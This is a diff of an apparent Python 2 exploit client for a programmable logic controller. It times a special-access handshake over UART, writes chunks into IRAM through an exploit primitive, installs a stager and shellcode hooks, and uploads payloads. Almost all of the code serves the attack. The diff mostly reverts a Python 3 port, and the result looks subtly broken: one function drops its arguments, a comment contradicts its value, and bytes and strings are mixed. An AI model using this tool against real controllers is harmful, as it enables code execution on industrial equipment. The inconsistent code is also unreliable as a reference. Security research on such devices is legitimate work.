@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 # Would you please hold my beer while I am cleaning this code?
 # ./client.py --switch-power --powersupply-host=localhost --powersupply-port=9001 --powersupply-delay=10 run -p payloads/hello_world/hello_world.bin
 
@@ -22,7 +22,7 @@ context.update(log_level="info", bits=32, endian="big")
 
 # Runtime configs
 # The number of seconds to sleep between every request to avoid UART buffer overflows
-SEND_REQ_SAFETY_SLEEP_AMT = 0.05
+SEND_REQ_SAFETY_SLEEP_AMT = 0.03 # Increased from 0.01
 
 
 # The default location of the stager payload
@@ -79,21 +79,16 @@ SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]
 
 
 def print_answ(r, answ):
-    print("Got answer: {} [{}]".format(repr(answ), answ.hex() if isinstance(answ, bytes) else hexlify(answ).decode()))
+    print("Got answer: {} [{}]".format(answ, hexlify(answ)))
 
 
-def calc_checksum_byte(incoming): # Type hint for clarity
+def calc_checksum_byte(incoming):
     # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
     # Checksum: LSB of negative sum of byte values
-    # 'incoming' is full_msg_before_checksum = bytes([len(msg) + 1]) + msg
-    # This means 'incoming' is exactly the bytes (Length + Payload) over which the sum should occur.
-    current_sum = sum(ord(c) for c in incoming)
-    # LSB of negative sum
-    checksum_val = (-current_sum) & 0xFF
-    return bytes([checksum_val])
+    return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]
 
 
-def send_packet(r, msg, step=2, sleep_amt=0.01): # Type hint for clarity
+def send_packet(r, msg, step=2, sleep_amt=0.01):
     """
     The base function to send a single packet. We need to chunk the packet
     up during transmission as to not overflowing the PLC's UART buffer.
@@ -109,19 +104,16 @@ def send_packet(r, msg, step=2, sleep_amt=0.01): # Type hint for clarity
     assert(len(msg) <= MAX_MSG_LEN)
     time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
     # First we need to pass the length
-    # msg is payload bytes, prepend length byte
-    full_msg_before_checksum = bytes([len(msg) + 1]) + msg
+    msg = chr(len(msg)+1)+msg
     # Then add the checksum to the packet
-    checksum = calc_checksum_byte(full_msg_before_checksum)
-    full_msg_with_checksum = full_msg_before_checksum + checksum
-
-    log.info("sending packet: {}".format(hexlify(full_msg_with_checksum)))
-    for i in range(0, len(full_msg_with_checksum), step):
+    msg = msg + calc_checksum_byte(msg)
+    log.info("sending packet: {}".format(msg.encode("hex")))
+    for i in range(0, len(msg), step):
         time.sleep(sleep_amt)
-        r.send(full_msg_with_checksum[i:i+step])
+        r.send(msg[i:i+step])
 
 
-def recv_packet(r): # Returns bytes
+def recv_packet(r):
     """
     Receive a single packet, verifying and discarding
     checksum and length metadata.
@@ -129,69 +121,22 @@ def recv_packet(r): # Returns bytes
     returns The actual contents of the packet without any metadata
     """
 
-    answ_first_byte = r.recv(1) # This is bytes
-    if not answ_first_byte:
-        # Handle case where recv returns empty, e.g. connection closed
-        log.error("recv_packet: Connection closed or no data received for length byte.")
-        return None # Or raise an exception
+    answ = r.recv(1)
+    rem = ord(answ)
+    while rem != 0:
+        add = r.recv(rem)
+        rem -= len(add)
+        answ += add
 
-    # answ_first_byte is the <Length> byte. Its value, L, is the number of bytes that follow
-    # (i.e., length of <Contents> + 1 for <ChecksumByte>).
-    length_of_following_data = answ_first_byte[0]
-
-    if length_of_following_data == 0:
-        # This implies an empty <Contents> and no <ChecksumByte>, which seems unlikely for this protocol.
-        # Or it means <Contents> is empty, and only <ChecksumByte> follows (L=1).
-        # If L=0, it's probably an error or unexpected packet.
-        # The original code would try to read 0 bytes and then checksum answ_first_byte itself.
-        log.warn("recv_packet: Received packet length L=0 (meaning 0 bytes follow length-byte). This is unusual.")
-        # For an empty payload ack, L=1 (for checksum), packet is <0x01><checksum>. Content is empty.
-        # If L=0, calc_checksum_byte(answ_first_byte[:-1]) would be on empty bytes if answ_first_byte is just one byte.
-        # This case should be handled by the checksum logic: if a packet is just <0x00>, it's invalid.
-        # Smallest valid packet is <0x01><checksum_byte> (e.g. ack). Content part is empty.
-        # Smallest packet with content: <0x02><content_byte><checksum_byte>. Content is one byte.
-        pass # Let the reading logic proceed. If length_of_following_data is 0, loop won't run.
-
-    received_payload_and_checksum = b""
-    bytes_remaining_to_read = length_of_following_data
-
-    while bytes_remaining_to_read > 0:
-        chunk = r.recv(bytes_remaining_to_read)
-        if not chunk:
-            log.error("recv_packet: Connection closed while reading payload/checksum.")
-            return None # Or raise an exception for critical failure
-        received_payload_and_checksum += chunk
-        bytes_remaining_to_read -= len(chunk)
-
-    # full_packet_as_sent_on_wire_minus_initial_length_byte = received_payload_and_checksum
-    # full_packet_including_length_byte = answ_first_byte + received_payload_and_checksum
-
-    packet_for_checksum_calc = answ_first_byte + received_payload_and_checksum[:-1] # <L><Contents>
-    received_checksum = received_payload_and_checksum[-1:] # <ChecksumByte>
-
-    if not packet_for_checksum_calc: # Should not happen if length_of_following_data >= 1
-        log.error("recv_packet: Packet too short, no data for checksum calculation.")
-        return None
-    if not received_checksum: # Should not happen if length_of_following_data >= 1
-        log.error("recv_packet: Packet too short, no checksum byte found.")
-        return None
-
-    calculated_checksum = calc_checksum_byte(packet_for_checksum_calc)
-
-    if calculated_checksum != received_checksum:
-        print("Checksum validity failed. Received Packet (L+Payload+CS): {} [{}], Calculated CS for (L+Payload): {}, Expected CS: {}".format(
-            repr(answ_first_byte + received_payload_and_checksum),
-            (answ_first_byte + received_payload_and_checksum).hex(),
-            calculated_checksum.hex(),
-            received_checksum.hex()))
+    if calc_checksum_byte(answ[:-1]) != answ[-1]:
+        print("Checksum validity failed. Got: {} [{}".format(
+            answ, answ.encode("hex")))
         return None
     else:
-        # Return only the <Contents> part
-        # <Contents> is received_payload_and_checksum[:-1]
-        return received_payload_and_checksum[:-1]
+        return answ[1:-1]
 
 
-def recv_many(r, verbose=False): # Returns bytes
+def recv_many(r, verbose=False):
     """
     Receive all packets until an empty packet is received.
     
@@ -199,22 +144,17 @@ def recv_many(r, verbose=False): # Returns bytes
     as dump_mem to send larger amounts of data at once.
     """
 
-    answ = b"" # Changed to bytes
+    answ = ""
     stop = False
 
     while not stop:
-        next_chunk = recv_packet(r) # Returns bytes or None
-        if next_chunk is None: # Error in recv_packet or connection closed
-            log.error("recv_many: Failed to receive next chunk.")
-            return None # Propagate error
-
-        if verbose and (len(answ) & 0xff) < 16: # len(answ) is fine for bytes
-            print("Read {}".format(len(answ))) # This print is fine
-
-        if next_chunk == b"": # Changed to bytes
+        next_chunk = recv_packet(r)
+        if verbose and (len(answ) & 0xff) < 16:
+            print("Read {}".format(len(answ)))
+        if next_chunk == "":
             stop = True
         else:
-            answ += next_chunk # Bytes concatenation
+            answ += next_chunk
     return answ
 
 def encode_packet_for_stager(chunk):
@@ -227,34 +167,19 @@ def encode_packet_for_stager(chunk):
     The encoding has to be reversed on the other side which is
     implemented in the payloads/stager sources
     """
-    # chunk must be bytes
     for i in range(1, 256):
-        # Check if byte `i` is in chunk (bytes comparison) or if `i` is the encoded length.
-        # `bytes([i]) not in chunk` is not direct. Need `bytes([i]) != x for x in chunk` or `i not in chunk` if chunk is list of ints.
-        # Original `chr(i) not in chunk` implies chunk was a string.
-        # If chunk is bytes: `bytes([i])` is a single byte. `chunk` is a sequence of bytes.
-        # `i not in chunk` checks if the integer value i is one of the byte values in chunk.
-        # `i != len(chunk)+2` is comparing int with int.
-
-        # Assuming `chunk` is bytes. The key `i` should not be present in the chunk.
-        # Also, the key `i` should not be equal to the length of the *encoded* chunk, which is `len(chunk) + 1` (for the key itself).
-        # The original `len(chunk)+2` might be from `len(payload_to_send_to_send_packet)` which includes length byte.
-        # Let's stick to original logic `i != len(chunk)+2` for now, assuming it relates to overall packet structure for stager.
-        if i not in chunk and i != (len(chunk) + 2): # Check if int i is in bytes chunk
+        if chr(i) not in chunk and i != len(chunk)+2:
             log.info("Sending chunk with xor key: 0x{:02x}".format(i))
-            # XOR each byte in the chunk with the key i
-            xored_chunk = bytes([b ^ i for b in chunk])
-            encoded = bytes([i]) + xored_chunk # Prepend key
-
+            encoded = chr(i) + "".join(map(lambda x: chr(ord(x) ^ i), chunk))
             # A quick attempt at a fix for a specific value-dependent UART failure
-            #if b"\xfe\xfe" in encoded: # Compare bytes with bytes
+            #if "\xfe\xfe" in encoded:
             #    continue
-            return encoded # Returns bytes
+            return encoded
 
-    print("Could not encode chunk: {}".format(chunk.hex())) # chunk is bytes
+    print("Could not encode chunk: {}".format(chunk.encode("hex")))
     assert (False)
 
-def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01): # msg is bytes
+def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
     """
     Transmit an arbitrarily sized message to a listening stager payload.
 
@@ -266,36 +191,28 @@ def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01): # msg is byt
         time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
         chunk = msg[i:i + MAX_MSG_LEN - 1]
         log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i)/float(len(msg))))
-        send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt) # encode_packet_for_stager returns bytes
-        answ = recv_packet(r) # Returns bytes or None
-        if answ is None:
-            log.error("send_full_msg_via_stager: Did not receive ACK after sending chunk.")
-            return None # Propagate error
-
-        if not len(answ) == 1: # len() is fine for bytes
-            print("expecting empty ack package (answ of size 1), got '{}' instead".format(repr(answ))) # Use repr for bytes
+        send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt)
+        answ = recv_packet(r)
+        if not len(answ) == 1:
+            print("expecting empty ack package (answ of size 1), got '{}' instead".format(answ))
             assert(False)
-        if answ == b"\xff": # Compare bytes with bytes
+        if answ == "\xff":
             print("[WARNING] Interrupting the sending...")
             return None
     # Send empty packet to signify end of transmission
-    send_packet(r, encode_packet_for_stager(b"")) # Pass bytes to encode_packet_for_stager
-    answ = recv_packet(r) # Returns bytes or None
-    if answ is None:
-        log.error("send_full_msg_via_stager: Did not receive ACK after sending empty packet.")
-        return None # Propagate error
+    send_packet(r, encode_packet_for_stager(""))
+    answ = recv_packet(r)
 
 
-def invoke_primary_handler(r, handler_ind, args=b"", await_response=True): # args should be bytes
+def invoke_primary_handler(r, handler_ind, args="", await_response=True):
     """
     Invoke the primary handler with index handler_ind.
     """
 
-    payload = bytes([handler_ind]) # Changed to bytes
-    # args is already bytes due to type hint
-    send_packet(r, payload + args)
+    payload = chr(handler_ind)
+    send_packet(r, payload+args)
     if await_response:
-        return recv_packet(r) # Returns bytes or None
+        return recv_packet(r)
     else:
         return None
 
@@ -306,24 +223,23 @@ def enter_subproto_handler(r, mode, args=""):
     in the given mode.
     """
     assert(1 <= mode <= len(SUBPROT_80_MODE_MAGICS))
-    # struct.pack returns bytes. args for enter_subproto_handler should be bytes.
-    packed_magic = struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode])
-    return invoke_primary_handler(r, 0x80, packed_magic + args)
+
+    return invoke_primary_handler(r, 0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))
 
 
 def leave_subproto_handler(r):
     """ 
     Leave the currently active subprotocol handler
     """
-    send_packet(r, b"\x81\xD0\x67") # Changed to bytes
+    send_packet(r, chr(0x81)+"\xD0\x67")
     return recv_packet(r)
 
 
 def subproto_read(r):
-    send_packet(r, b"\x83") # Changed to bytes
+    send_packet(r, chr(0x83))
     return recv_packet(r)
 
-def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01): # add_args is bytes
+def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01):
     """
     Only use when alredy in subprotocol handler.
     
@@ -340,12 +256,11 @@ def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.0
 
     # This one is dangerous to use as it may mess up stuff in the device
     assert(really == True)
-    # struct.pack returns bytes. add_args is bytes.
-    send_packet(r, b"\x84\x5a\x2e" + struct.pack(">I", arg_dw) + add_args, step, sleep_amt)
+    send_packet(r, chr(0x84)+"\x5a\x2e"+struct.pack(">I", arg_dw)+add_args, step, sleep_amt)
     return recv_packet(r)
 
 
-def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False): # contents is bytes
+def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False):
     """
     This function is part of the exploit and allows writing small chunks
     of bytes into IRAM memory. With the primitive itself being slow and
@@ -497,7 +412,7 @@ def install_stager(r, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT
 def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
     invoke_add_hook(r, stager_add_hook_ind,
                        struct.pack(">I", tar_addr), False)
-    send_full_msg_via_stager(r, contents, 8, 0.05) # Increased sleep_amt
+    send_full_msg_via_stager(r, contents, 8, 0.03) # Increased from 0.01
 
 
 def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
@@ -536,16 +451,23 @@ def handle_conn(r, action, args):
     global next_payload_location
 
     print("[+] Got connection")
-    # The initial greeting from the PLC (unrecv'd by main) is not in our custom packet format.
-    # Read it raw, e.g., until newline.
+    raw_greeting = ""
     try:
-        answ = r.recvuntil(b'\n', timeout=2.0)
-        log.info("Raw PLC greeting received: %r", answ)
-        print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(answ, hexlify(answ))+ '\x1b[0m')
-    except Exception as e:
-        log.error("Error receiving initial PLC greeting: %s", str(e))
-        # Decide if to proceed or raise. For now, log and proceed, get_version might fail.
-        # If this happens, the connection might be stale or PLC not responding as expected.
+        # Attempt to read the greeting that was unrecv'd by main().
+        # Max length of greeting read by main() could be 256 + 256 = 512.
+        # Use a timeout to avoid blocking indefinitely if something went wrong with unrecv.
+        raw_greeting = r.recv(512, timeout=1.0)
+        log.info("Raw PLC greeting consumed in handle_conn: %r", raw_greeting)
+        print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(raw_greeting, hexlify(raw_greeting))+ '\x1b[0m')
+        # It's crucial that this greeting is what we expect, otherwise subsequent protocol messages will be misaligned.
+        if not raw_greeting.startswith("\5-CPU"):
+            log.warn("Consumed greeting in handle_conn (%r) did not start with \\5-CPU as expected.", raw_greeting)
+            # Depending on strictness, might want to return or raise here.
+            # If it's empty or wrong, get_version will likely fail.
+    except Exception as e: # Catches pwntools EOFError if timeout occurs and no data, or socket.timeout
+        log.error("Error consuming initial PLC greeting in handle_conn: %s. Greeting buffer was: %r", str(e), raw_greeting)
+        # If we can't consume the greeting, subsequent protocol communication will likely fail.
+        return # Exit handle_conn
 
     for i in range(1):
         version = get_version(r)
@@ -606,10 +528,10 @@ def handle_conn(r, action, args):
         while True:
             packet = recv_packet(r)
             if packet is None:
-                log.error("HELLO_LOOP: Failed to receive packet or connection possibly lost.")
+                log.error("HELLO_LOOP: Failed to receive valid packet or connection issue.")
                 time.sleep(0.5) # Avoid tight loop on continuous errors
-                # Consider breaking if this happens too often or if None means definite end
-                continue # Try to receive next packet
+                # Consider 'break' if this error means communication is lost
+                continue
             print("Got packet: {}".format(packet))
 
     elif action == ACTION_TIC_TAC_TOE:
@@ -620,13 +542,11 @@ def handle_conn(r, action, args):
         while END_TOKEN not in msg:
             packet = recv_packet(r)
             if packet is None:
-                log.error("TIC_TAC_TOE: Failed to receive packet or connection possibly lost.")
-                # Decide how to handle this: break, or try again?
-                # Breaking might be safest if communication is lost.
-                msg = "ERROR_RECEIVING_PACKET" # Ensure loop terminates or handles error state
+                log.error("TIC_TAC_TOE: Failed to receive valid packet or connection issue.")
+                # Breaking here is probably appropriate as game state would be lost/invalid
                 break
             msg = packet
-            sys.stdout.write(msg)
+            sys.stdout.write(msg) # msg is now a byte string, sys.stdout might prefer str in py2
             sys.stdout.flush()
 
             if "enter a number" in msg:
@@ -686,7 +606,7 @@ def main():
     ps_modbus_group.add_argument('--ps-modbus-coil', dest='ps_modbus_coil', default=0, type=int,
                         help='Modbus coil address (0-indexed) to control (default: 0).')
 
-    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME,
+    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME,
                         help='the location of the stager payload')
     parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
     parser.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic")
@@ -706,16 +626,16 @@ def main():
 
 
     parser_test = subparsers.add_parser(ACTION_TEST)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_world/hello_world.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')
 
     parser_test = subparsers.add_parser(ACTION_HELLO_LOOP)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/hello_loop/build/hello_loop.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
                         help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
     
 
     parser_test = subparsers.add_parser(ACTION_TIC_TAC_TOE)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
+    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                         help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')
 
  
@@ -771,10 +691,13 @@ def main():
         # We have 500000 microseconds (half a second) to hit the timing
         s.send(pad + magic)
 
-        answ = s.recv(256, timeout=0.3) # Original short timeout
+        answ = s.recv(256, timeout=0.3)
         if len(answ) > 0:
             if not answ.startswith("\5-CPU"):
-                answ += s.recv(256) # Original logic for appending (default timeout)
+                try:
+                    answ += s.recv(256, timeout=0.2) # Added short timeout
+                except Exception: # Catch pwntools timeout (EOFError or socket.timeout)
+                    pass # If timeout, answ remains as it was
             assert(answ.startswith("\5-CPU"))
             s.unrecv(answ)
 
